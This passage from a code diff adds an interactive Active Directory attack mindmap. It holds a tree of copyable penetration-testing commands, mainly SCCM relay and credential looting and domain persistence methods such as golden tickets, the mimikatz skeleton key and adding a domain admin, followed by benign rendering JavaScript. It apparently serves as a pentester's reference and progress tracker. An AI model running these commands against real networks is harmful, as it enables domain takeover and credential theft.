dns"}],"outcome":"Admin"}]}],"row":2,"col":3},{"id":"sccm","label":"SCCM","color":"#ebfbee","children":[{"id":"sccm-687","label":"recon","children":[{"id":"sccm-688","label":"","children":[{"id":"sccm-689","label":"","cmd":"sccmhunter.py show -all"}],"cmd":"sccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -debug"},{"id":"sccm-690","label":"","cmd":"ldeep ldap -u $USER -p $PASSWORD -d $DOMAIN -s ldap://$DC_IP sccm"},{"id":"sccm-691","label":"","cmd":"nxc smb $SCCM_SERVER -u $USER -p $PASSWORD -d $DOMAIN --shares"}]},{"id":"sccm-692","label":"Creds-1 No credentials","children":[{"id":"sccm-693","label":"Extract from pxe See no creds","outcome":"PXE"}],"outcome":"NAA credentials || User + Pass"},{"id":"sccm-694","label":"Elevate-1:Relay on site systems Simple user","children":[{"id":"sccm-695","label":"coerce sccm site server","children":[{"id":"sccm-696","label":"","cmd":"ntlmrelayx.py -tf $TARGET -smb2support"}]}],"outcome":"Admin on Site system"},{"id":"sccm-697","label":"Elevate-2:Force client push Simple user","children":[{"id":"sccm-698","label":"","children":[{"id":"sccm-699","label":"","children":[{"id":"sccm-700","label":"","children":[{"id":"sccm-701","label":"cleanup"}],"cmd":"proxychains smbexec.py -no-pass $DOMAIN/$SOCKS_USER@$SCCM_SERVER"}],"cmd":"SharpSCCM.exe invoke client-push -mp $SCCM_SERVER.$DOMAIN -sc $SITE_CODE -t $LISTENER # Launch client push install"}],"cmd":"ntlmrelayx.py -t $SCCM_SERVER -smb2support -socks # listen connection"}],"outcome":"Admin"},{"id":"sccm-702","label":"Elevate-3:Automatic client push Simple user","children":[{"id":"sccm-703","label":"Create DNS A record for non existing computer x","children":[{"id":"sccm-704","label":"","children":[{"id":"sccm-705","label":"Enroll new computer x in AD  then remove host SPN from the machine account","children":[{"id":"sccm-706","label":"","children":[{"id":"sccm-707","label":"wait 5m for client push","children":[{"id":"sccm-708","label":"","children":[{"id":"sccm-709","label":"cleanup"}],"cmd":"ntlmrelayx.py -tf $TARGET -smb2support -socks"}]}],"cmd":"setspn -D host/$COMPUTER_NAME $COMPUTER_NAME setspn -D host/$COMPUTER_NAME.$DOMAIN $COMPUTER_NAME"}]}],"cmd":"dnstool.py -u '$DOMAIN\\$USER' -p $PASSWORD  -r $COMPUTER_NAME.$DOMAIN -a add -t A -d $LISTENER $DC_IP"}]}],"outcome":"Relay ntlm"},{"id":"sccm-710","label":"CRED-6 Loot creds","children":[{"id":"sccm-711","label":"SCCM SMB service (445/TCP) on a DP","children":[{"id":"sccm-712","label":"","cmd":"cmloot.py $DOMAIN/$USER:$PASSWORD@$SCCM_DP -cmlootinventory sccmfiles.txt"}]},{"id":"sccm-713","label":"SCCM HTTP service (80/TCP or 443/TCP) on a DP","children":[{"id":"sccm-714","label":"","cmd":"SCCMSecrets.py policies -mp http://$TARGET -u '$COMPUTER_NAME$' -p '$COMPUTER_PASS' -cn '$CLIENT_NAME'"},{"id":"sccm-715","label":"","cmd":"SCCMSecrets.py files -dp http://$TARGET -u '$USER' -p '$PASSWORD'"},{"id":"sccm-716","label":"","cmd":"sccm-http-looter -server $TARGET"}]}],"outcome":"User + Pass"},{"id":"sccm-717","label":"Takeover-1:relay to mssql db Simple user","children":[{"id":"sccm-718","label":"SCCM MSSQL != SSCM server","children":[{"id":"sccm-719","label":"","children":[{"id":"sccm-720","label":"","children":[{"id":"sccm-721","label":"coerce sccm_mssql -> attacker","children":[{"id":"sccm-722","label":"","cmd":"sccmhunter.py admin -u $USER@$DOMAIN -p '$PASSWORD' -ip $SCCM_IP"}]}],"cmd":"ntlmrelayx.py -smb2support -ts -t mssql://$SCCM_MSSQL -q \"$QUERY\""}],"cmd":"sccmhunter.py mssql -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -debug -tu $USER -sc $SITE_CODE -stacked"}]}],"outcome":"SCCM ADMIN"},{"id":"sccm-723","label":"Takeover-2:relay to mssql server Simple user","children":[{"id":"sccm-724","label":"SCCM MSSQL != SSCM server","children":[{"id":"sccm-725","label":"","children":[{"id":"sccm-726","label":"coerce sccm_server","children":[{"id":"sccm-727","label":"","cmd":"proxychains smbexec.py -no-pass $DOMAIN/'$SCCM_SERVER$'@$SCCM_IP"}]}],"cmd":"ntlmrelayx.py -t $SCCM_MSSQL -smb2support -socks"}]}],"outcome":"Admin MSSQL"},{"id":"sccm-728","label":"Creds-2:Policy Request Credentials Simple user","children":[{"id":"sccm-729","label":"add computer","children":[{"id":"sccm-730","label":"","children":[{"id":"sccm-731","label":"get NetworkAccessUsername and NetworkAccessPassword","children":[{"id":"sccm-732","label":"","children":[{"id":"sccm-733","label":"delete device created after sccmadmin"}],"cmd":"policysecretunobfuscate.py"}]}],"cmd":"sccmwtf.py newcomputer newcomputer.$DOMAIN $TARGET '$DOMAIN\\$COMPUTER_NAME$' '$COMPUTER_PASS'"},{"id":"sccm-734","label":"","children":[{"id":"sccm-735","label":"cleanup"}],"cmd":"SharpSCCM.exe get secrets -r newcomputer -u $COMPUTER_NAME$ -p $COMPUTER_PASS\""}]}],"outcome":"User + Pass"},{"id":"sccm-736","label":"Creds-3Creds-4 Computer Admin user","children":[{"id":"sccm-737","label":"","cmd":"dploot.py sccm -u $USER -p '$PASSWORD' $SCCM_TARGET"},{"id":"sccm-738","label":"","cmd":"sccmhunter.py dpapi  -u $USER -p '$PASSWORD' -target $SCCM_TARGET -debug"},{"id":"sccm-739","label":"","cmd":"SharpSCCM.exe local secrets -m disk"},{"id":"sccm-740","label":"","cmd":"SharpSCCM.exe local secrets -m wmi"}],"outcome":"NAA credentials"},{"id":"sccm-741","label":"Creds-5 SCCM admin","children":[{"id":"sccm-742","label":"","children":[{"id":"sccm-743","label":"","children":[{"id":"sccm-744","label":"","children":[{"id":"sccm-745","label":"","children":[{"id":"sccm-746","label":"","cmd":"sccmdecryptpoc.exe $CYPHERED_VALUE"}],"cmd":"SELECT * FROM SC_UserAccount;"}],"cmd":"use CM_$SITE_CODE;"}],"cmd":"mssqlclient.py -windows-auth -hashes '$SCCM_TARGET_HASHNT' '$DOMAIN/$SCCM_TARGET$'@$SCCM_MSSQL"}],"cmd":"secretsdump.py $DOMAIN/$USER:'$PASSWORD'@$SCCM_TARGET"}],"outcome":"Site DB credentials"},{"id":"sccm-747","label":"EXEC-1/2 SCCM admin","children":[{"id":"sccm-748","label":"","cmd":"SharpSCCM.exe exec -p $BINARY -d $DEVICE_NAME -sms $SMS_PROVIDER -sc $SITECODE --no-banner"},{"id":"sccm-749","label":"","children":[{"id":"sccm-750","label":"","children":[{"id":"sccm-751","label":"","children":[{"id":"sccm-752","label":"","cmd":"script xploit.ps1"}],"cmd":"interact $DEVICE_ID"}],"cmd":"get_device $HOSTNAME"}],"cmd":"sccmhunter.py admin -u $USER@$DOMAIN -p '$PASSWORD' -ip $SCCM_IP"}],"outcome":"lat"},{"id":"sccm-753","label":"Cleanup","children":[{"id":"sccm-754","label":"","children":[{"id":"sccm-755","label":"","cmd":"SharpSCCM.exe remove device GUID:$GUID -sms $SMS_PROVIDER -sc $SITECODE"}],"cmd":"SharpSCCM.exe get devices -sms $SMS_PROVIDER -sc $SITECODE -n $LISTENER -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier\""}]},{"id":"sccm-756","label":"Post exploit","children":[{"id":"sccm-757","label":"as sccm admin","children":[{"id":"sccm-758","label":"","cmd":"SCCMHound.exe --server $TARGET --sitecode $SITECODE","outcome":"Users sessions"}]}]}],"row":2,"col":4},{"id":"persistence","label":"Persistence","color":"#BC7634","children":[{"id":"persistence-662","label":"ADD DA","children":[{"id":"persistence-663","label":"","cmd":"net group \"domain admins\" myuser /add /domain"}]},{"id":"persistence-664","label":"Golden ticket","children":[{"id":"persistence-665","label":"","cmd":"ticketer.py -aesKey $AESKEY -domain-sid $DOMAIN_SID -domain $DOMAIN $ANYUSER"},{"id":"persistence-666","label":"","cmd":"mimikatz \"kerberos::golden /user:$USER /domain:$DOMAIN /sid:$DOMAIN_SID/aes256:$AESKEY /ptt\""}]},{"id":"persistence-667","label":"Silver Ticket","children":[{"id":"persistence-668","label":"","cmd":"mimikatz \"kerberos::golden /sid:$CURRENT_USER_SID /domain:$DOMAIN_SID /target:$TARGET_SERVER /service:$TARGET_SERVICE /aes256:$COMPUTER_AES256_KEY /user:$ANYUSER /ptt\""},{"id":"persistence-669","label":"","cmd":"ticketer.py -nthash $COMPUTER_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN $ANYUSER"}]},{"id":"persistence-670","label":"Directory Service Restore Mode (DSRM)","children":[{"id":"persistence-671","label":"","cmd":"PowerShell New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD"}]},{"id":"persistence-672","label":"Skeleton Key","children":[{"id":"persistence-673","label":"","cmd":"mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" #password is mimikatz"}]},{"id":"persistence-674","label":"Custom SSP","children":[{"id":"persistence-675","label":"","children":[{"id":"persistence-676","label":"C:\\Windows\\System32\\kiwissp.log"}],"cmd":"mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\""}]},{"id":"persistence-677","label":"Golden certificate","children":[{"id":"persistence-678","label":"","children":[{"id":"persistence-679","label":"","cmd":"certipy forge -ca-pfx $CA_PRIVATE_KEY -upn $USER@$DOMAIN -subject 'CN=$USER,CN=Users,DC=$CORP,DC=$LOCAL"}],"cmd":"certipy ca -backup -ca '$CA_NAME' -username $USER@$DOMAIN -hashes $NT_HASH"}]},{"id":"persistence-680","label":"Diamond ticket","children":[{"id":"persistence-681","label":"","cmd":"ticketer.py -request -domain $DOMAIN -user $USER -password $PASSWORD -nthash $NT_HASH -aesKey $AESKEY -domain-sid $DOMAIN_SID  -user-id $USER_ID -groups '512,513,518,519,520' $ANYUSER"}]},{"id":"persistence-682","label":"Saphire Ticket","children":[{"id":"persistence-683","label":"","cmd":"ticketer.py -request -impersonate $ANYUSER -domain $DOMAIN -user $USER -password $PASSWORD  -nthash $NT_HASH -aesKey $AESKEY -domain-sid $DOMAIN_SID  'ignored'"}]},{"id":"persistence-684","label":"DC shadow"},{"id":"persistence-685","label":"ACL manipulation"},{"id":"persistence-686","label":"..."}],"row":2,"col":6}]};
+
+/*
+ * Interactive AD mindmap (Orange Cyberdefense layout).
+ *  - grid of boxes (columns = progression), placed from conf.yml.
+ *  - each box holds a tree with collapsible branches.
+ *  - each node: copyable command, outcome, status cycle ✓ / ✗ / —.
+ * Progress is persisted via /api/progress (data/progress.json).
+ */
+
+const CYCLE = { todo: "ok", ok: "ko", ko: "todo" };
+const GLYPH = { ok: "✓", ko: "✗", todo: "—" };
+
+let tree = { nodes: [], grid: { cols: 7, rows: 3 } };
+let progress = {};
+const collapsed = new Set();
+let filter = "";
+
+/* ---------- Progress storage (localStorage) ---------- */
+const LS_KEY = "admap:progress";
+function loadProgress() {
+  try { return JSON.parse(localStorage.getItem(LS_KEY)) || {}; } catch { return {}; }
+}
+function saveProgress() {
+  try { localStorage.setItem(LS_KEY, JSON.stringify(progress)); } catch {}
+}
+
+/* ---------- Helpers ---------- */
+function el(tag, cls, text) {
+  const n = document.createElement(tag);
+  if (cls) n.className = cls;
+  if (text != null) n.textContent = text;
+  return n;
+}
+// Render a command, wrapping each variable ($VAR) so it stands out.
+const CMD_VAR_RE = /\$[A-Za-z_][A-Za-z0-9_]*/g;
+function renderCmd(code, cmd) {
+  code.textContent = "";
+  let last = 0, m;
+  while ((m = CMD_VAR_RE.exec(cmd)) !== null) {
+    if (m.index > last) code.appendChild(document.createTextNode(cmd.slice(last, m.index)));
+    code.appendChild(el("span", "cmd-var", m[0]));
+    last = m.index + m[0].length;
+  }
+  if (last < cmd.length) code.appendChild(document.createTextNode(cmd.slice(last)));
+}
+const kids = (n) => (Array.isArray(n.children) ? n.children : []);
+const hasKids = (n) => kids(n).length > 0;
+const statusOf = (id) => (progress[id] && progress[id].status) || "todo";
+const noteOf = (id) => (progress[id] && progress[id].note) || "";
+
+function matchNode(n) {
+  if (!filter) return true;
+  const hay = ((n.label || "") + " " + (n.cmd || "") + " " + (n.outcome || "")).toLowerCase();
+  if (hay.includes(filter)) return true;
+  return kids(n).some(matchNode);
+}
+
+function rollup(node) {
+  let ok = 0, ko = 0, total = 0;
+  (function walk(n) {
+    if (hasKids(n)) { n.children.forEach(walk); return; }
+    total++;
+    const s = statusOf(n.id);
+    if (s === "ok") ok++; else if (s === "ko") ko++;
+  })(node);
+  return { ok, ko, total };
+}
+
+/* ---------- Rendering ---------- */
+function render() {
+  const board = document.getElementById("board");
+  board.textContent = "";
+  const plane = el("div");
+  plane.id = "plane";
+  board.appendChild(plane);
+
+  const cols = tree.grid.cols || 7;
+  const columns = [];
+  for (let c = 0; c < cols; c++) {
+    const col = el("div", "column");
+    plane.appendChild(col);
+    columns.push(col);
+  }
+  const boxes = tree.nodes.slice().sort((a, b) => (a.row - b.row));
+  boxes.forEach((box) => {
+    if (filter && !matchNode(box)) return;
+    columns[box.col % cols].appendChild(renderBox(box));
+  });
+  alignConnectors(board);
+  applyView();
+  updateSummary();
+}
+
+const rowOf = (node) => node.querySelector(":scope > .node-row");
+
+// Where a connector meets a node, within its own row: a leaf joins at its
+// underline (bottom), a branch pill joins at its center.
+function anchorInRow(node) {
+  const r = rowOf(node);
+  return node.classList.contains("has-kids") ? r.offsetTop + r.offsetHeight / 2
+                                             : r.offsetTop + r.offsetHeight - 2;
+}
+
+// Lay out the tree connectors so a parent points at the midpoint between its
+// first and last child anchors. Measured in layout coords (offset*), so it is
+// unaffected by the board's zoom transform. Deepest branches first, so child
+// heights are final before a parent measures them.
+function alignConnectors(root) {
+  for (const node of [...root.querySelectorAll(".node.has-kids")].reverse()) {
+    const row = rowOf(node);
+    if (node.classList.contains("collapsed")) {
+      node.style.alignItems = "";
+      if (row) row.style.marginTop = "";
+      continue;
+    }
+    const childrenEl = node.querySelector(":scope > .node-children");
+    if (!childrenEl || !row) continue;
+    const kids = [...childrenEl.children].filter((e) => e.classList.contains("node"));
+    if (!kids.length) continue;
+    const anchor = (kid) => kid.offsetTop + anchorInRow(kid);
+    const first = anchor(kids[0]);
+    const last = anchor(kids[kids.length - 1]);
+    const mid = (first + last) / 2;
+    childrenEl.style.setProperty("--first", first + "px");
+    childrenEl.style.setProperty("--spine", (last - first) + "px");
+    childrenEl.style.setProperty("--mid", mid + "px");
+    node.style.alignItems = "flex-start";
+    row.style.marginTop = Math.max(0, mid - row.offsetHeight / 2) + "px";
+  }
+  root.querySelectorAll(".node-children > .node").forEach((kid) => {
+    if (rowOf(kid)) kid.style.setProperty("--rc", anchorInRow(kid) + "px");
+  });
+}
+
+/* ---------- Zoom / pan ---------- */
+const view = { tx: 0, ty: 0, scale: 1 };
+let justPanned = false;
+
+function applyView() {
+  const plane = document.getElementById("plane");
+  if (plane) plane.style.transform = `translate(${view.tx}px,${view.ty}px) scale(${view.scale})`;
+}
+function zoomBy(factor, cx, cy) {
+  const b = document.getElementById("board").getBoundingClientRect();
+  if (cx == null) { cx = b.width / 2; cy = b.height / 2; }
+  const ns = Math.max(0.15, Math.min(3, view.scale * factor));
+  view.tx = cx - (cx - view.tx) * (ns / view.scale);
+  view.ty = cy - (cy - view.ty) * (ns / view.scale);
+  view.scale = ns;
+  applyView();
+}
+function resetView() { view.tx = 0; view.ty = 0; view.scale = 1; applyView(); }
+
+function initPanZoom() {
+  const board = document.getElementById("board");
+  let down = false, panning = false, pid = null, sx = 0, sy = 0, ox = 0, oy = 0;
+
+  board.addEventListener("pointerdown", (e) => {
+    if (e.button !== 0) return;
+    if (e.target.closest(".chip, .copy-btn, .note-btn")) return;
+    down = true; panning = false; pid = e.pointerId;
+    sx = e.clientX; sy = e.clientY; ox = view.tx; oy = view.ty;
+    // no pointer capture here, so a plain click still reaches the branch
+  });
+  board.addEventListener("pointermove", (e) => {
+    if (!down) return;
+    if (!panning && Math.abs(e.clientX - sx) + Math.abs(e.clientY - sy) > 4) {
+      panning = true;
+      board.classList.add("grabbing");
+      try { board.setPointerCapture(pid); } catch {}
+    }
+    if (panning) {
+      view.tx = ox + (e.clientX - sx);
+      view.ty = oy + (e.clientY - sy);
+      applyView();
+      e.preventDefault();
+    }
+  });
+  const end = () => {
+    if (!down) return;
+    down = false;
+    board.classList.remove("grabbing");
+    if (panning) { justPanned = true; setTimeout(() => (justPanned = false), 0); }
+    panning = false;
+  };
+  board.addEventListener("pointerup", end);
+  board.addEventListener("pointercancel", end);
+  board.addEventListener("selectstart", (e) => { if (panning) e.preventDefault(); });
+
+  board.addEventListener("wheel", (e) => {
+    e.preventDefault();
+    const b = board.getBoundingClientRect();
+    zoomBy(e.deltaY < 0 ? 1.12 : 1 / 1.12, e.clientX - b.left, e.clientY - b.top);
+  }, { passive: false });
+}
+
+function renderBox(box) {
+  const wrap = el("div", "box" + (collapsed.has(box.id) ? " collapsed" : ""));
+  wrap.dataset.id = box.id;
+  const color = box.color || "#4aa3ff";
+  wrap.style.setProperty("--accent", color);
+
+  const head = el("div", "box-head");
+  head.appendChild(el("span", "caret", "▾"));
+  head.appendChild(el("span", "box-dot"));
+  head.appendChild(el("span", "box-title", box.label));
+  const r = rollup(box);
+  const cnt = el("span", "box-count");
+  cnt.innerHTML = `<b class="ok">${r.ok}</b>✓ <b class="ko">${r.ko}</b>✗<span class="muted">/${r.total}</span>`;
+  head.appendChild(cnt);
+  head.addEventListener("click", () => { if (!justPanned) toggle(box.id, wrap); });
+  wrap.appendChild(head);
+
+  const body = el("div", "box-body");
+  kids(box).forEach((c) => { if (!filter || matchNode(c)) body.appendChild(renderNode(c)); });
+  wrap.appendChild(body);
+  return wrap;
+}
+
+function renderNode(node) {
+  const branch = hasKids(node);
+  const open = branch && !collapsed.has(node.id) || (filter && branch);
+  const wrap = el("div", "node" + (branch ? " has-kids" : "") + (branch && !open ? " collapsed" : ""));
+  wrap.dataset.id = node.id;
+  wrap.dataset.status = statusOf(node.id);
+
+  const row = el("div", "node-row");
+
+  const caret = el("span", "caret" + (branch ? "" : " leaf"), branch ? "▾" : "");
+  row.appendChild(caret);
+
+  const chip = el("button", "chip " + statusOf(node.id), GLYPH[statusOf(node.id)]);
+  chip.title = "Click: — → ✓ → ✗";
+  chip.addEventListener("click", (e) => { e.stopPropagation(); cycleStatus(node.id, wrap, chip); });
+  row.appendChild(chip);
+
+  const content = el("span", "node-content");
+  if (node.cmd) {
+    const code = el("code", "node-cmd");
+    renderCmd(code, node.cmd);
+    content.appendChild(code);
+    const copy = el("button", "copy-btn", "⧉");
+    copy.title = "Copy command";
+    copy.addEventListener("click", (e) => { e.stopPropagation(); doCopy(node.cmd, copy); });
+    content.appendChild(copy);
+  } else {
+    content.appendChild(el("span", "node-label", node.label || "·"));
+  }
+  if (node.outcome) {
+    const out = el("span", "outcome");
+    out.textContent = "→ " + node.outcome;
+    content.appendChild(out);
+  }
+  row.appendChild(content);
+
+  // a bubble just signals a note exists; its content opens in a modal
+  const note = noteOf(node.id);
+  const noteBtn = el("button", "note-btn" + (note ? " has-note" : ""), note ? "💬" : "✎");
+  noteBtn.title = note ? "View / edit note" : "Add a note";
+  noteBtn.addEventListener("click", (e) => { e.stopPropagation(); openNoteModal(node); });
+  row.appendChild(noteBtn);
+
+  if (branch) row.addEventListener("click", () => { if (!justPanned) toggle(node.id, wrap); });
+  wrap.appendChild(row);
+
+  if (branch) {
+    const ch = el("div", "node-children");
+    node.children.forEach((c) => { if (!filter || matchNode(c)) ch.appendChild(renderNode(c)); });
+    wrap.appendChild(ch);
+  }
+  return wrap;
+}
+
+function doCopy(text, btn) {
+  const done = () => { btn.textContent = "✓"; btn.classList.add("copied"); setTimeout(() => { btn.textContent = "⧉"; btn.classList.remove("copied"); }, 1000); };
+  (navigator.clipboard ? navigator.clipboard.writeText(text) : Promise.reject())
+    .then(done)
+    .catch(() => {
+      const t = document.createElement("textarea");
+      t.value = text; document.body.appendChild(t); t.select();
+      try { document.execCommand("copy"); done(); } catch { toast("Copy failed"); }
+      t.remove();
+    });
+}
+
+/* ---------- State ---------- */
+function toggle(id, elNode) {
+  if (filter) return;
+  if (collapsed.has(id)) collapsed.delete(id); else collapsed.add(id);
+  elNode.classList.toggle("collapsed");
+  alignConnectors(document.getElementById("board"));
+}
+
+function cycleStatus(id, wrap, chip) {
+  const next = CYCLE[statusOf(id)];
+  progress[id] = progress[id] || {};
+  progress[id].status = next;
+  wrap.dataset.status = next;
+  chip.className = "chip " + next;
+  chip.textContent = GLYPH[next];
+  saveProgress();
+  refreshCounts();
+  updateSummary();
+}
+
+function openNoteModal(node) {
+  const id = node.id;
+  const overlay = el("div", "modal-overlay");
+  const modal = el("div", "modal");
+
+  modal.appendChild(el("div", "modal-head", noteOf(id) ? "Edit note" : "Add a note"));
+  const sub = el("div", "modal-sub");
+  sub.textContent = (node.cmd || node.label || "This step").trim();
+  modal.appendChild(sub);
+
+  const ta = el("textarea", "modal-textarea");
+  ta.value = noteOf(id);
+  ta.placeholder = "Write a note for this step… (Ctrl+Enter to save)";
+  modal.appendChild(ta);
+
+  const actions = el("div", "modal-actions");
+  if (noteOf(id)) {
+    const del = el("button", "btn btn-danger", "Delete");
+    del.addEventListener("click", () => commit(""));
+    actions.appendChild(del);
+  }
+  actions.appendChild(el("span", "modal-spacer"));
+  const cancel = el("button", "btn", "Cancel");
+  cancel.addEventListener("click", close);
+  const save = el("button", "btn btn-primary", "Save");
+  save.addEventListener("click", () => commit(ta.value));
+  actions.append(cancel, save);
+  modal.appendChild(actions);
+
+  overlay.appendChild(modal);
+  overlay.addEventListener("mousedown", (e) => { if (e.target === overlay) close(); });
+  document.addEventListener("keydown", onKey);
+  document.body.appendChild(overlay);
+  ta.focus();
+  ta.setSelectionRange(ta.value.length, ta.value.length);
+
+  function onKey(e) {
+    if (e.key === "Escape") close();
+    else if (e.key === "Enter" && (e.ctrlKey || e.metaKey)) commit(ta.value);
+  }
+  function close() {
+    document.removeEventListener("keydown", onKey);
+    overlay.remove();
+  }
+  function commit(text) {
+    progress[id] = progress[id] || {};
+    const t = (text || "").trim();
+    if (t) progress[id].note = t; else delete progress[id].note;
+    saveProgress();
+    close();
+    render();
+  }
+}
+
+function refreshCounts() {
+  document.querySelectorAll(".box").forEach((box) => {
+    const node = tree.nodes.find((n) => n.id === box.dataset.id);
+    if (!node) return;
+    const r = rollup(node);
+    const c = box.querySelector(":scope > .box-head > .box-count");
+    if (c) c.innerHTML = `<b class="ok">${r.ok}</b>✓ <b class="ko">${r.ko}</b>✗<span class="muted">/${r.total}</span>`;
+  });
+}
+
+function updateSummary() {
+  let ok = 0, ko = 0, total = 0;
+  tree.nodes.forEach((b) => { const r = rollup(b); ok += r.ok; ko += r.ko; total += r.total; });
+  const done = ok + ko, pct = total ? Math.round((done / total) * 100) : 0;
+  document.getElementById("summary").textContent =
+    `✓ ${ok} · ✗ ${ko} · ${done}/${total} tested (${pct}%)`;
+}
+
+function eachNode(fn) {
+  (function walk(list) { list.forEach((n) => { fn(n); if (hasKids(n)) walk(n.children); }); })(tree.nodes);
+}
+function setAllCollapsed(flag) {
+  collapsed.clear();
+  if (flag) eachNode((n) => { if (hasKids(n)) collapsed.add(n.id); });
+  render();
+}
+
+/* ---------- Misc ---------- */
+function toast(msg) {
+  const t = document.getElementById("toast");
+  t.textContent = msg; t.hidden = false;
+  clearTimeout(toast._t); toast._t = setTimeout(() => (t.hidden = true), 1800);
+}
+function resetProgress() {
+  if (!confirm("Reset all progress?")) return;
+  progress = {};
+  saveProgress();
+  render();
+  toast("Progress reset");
+}
+
+/* ---------- Startup ---------- */
+function boot() {
+  progress = loadProgress();
+  tree = { nodes: MINDMAP.nodes || [], grid: MINDMAP.grid || { cols: 7, rows: 3 } };
+  // default: boxes open, inner branches collapsed
+  tree.nodes.forEach((box) => kids(box).forEach(function mark(n) {
+    if (hasKids(n)) { collapsed.add(n.id); n.children.forEach(mark); }
+  }));
+  render();
+}
+
+document.getElementById("expand-all").addEventListener("click", () => setAllCollapsed(false));
+document.getElementById("collapse-all").addEventListener("click", () => setAllCollapsed(true));
+document.getElementById("reset").addEventListener("click", resetProgress);
+document.getElementById("search").addEventListener("input", (e) => {
+  filter = e.target.value.trim().toLowerCase();
+  render();
+});
+document.getElementById("zoom-in").addEventListener("click", () => zoomBy(1.2));
+document.getElementById("zoom-out").addEventListener("click", () => zoomBy(1 / 1.2));
+document.getElementById("zoom-reset").addEventListener("click", resetView);
+window.addEventListener("keydown", (e) => {
+  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
+  if (e.key === "+" || e.key === "=") zoomBy(1.2);
+  else if (e.key === "-") zoomBy(1 / 1.2);
+  else if (e.key === "0") resetView();
+});
+
+initPanZoom();
+try { boot(); } catch (e) { toast("Load error: " + e.message); }
+
+  </script>
+</body>
+</html>
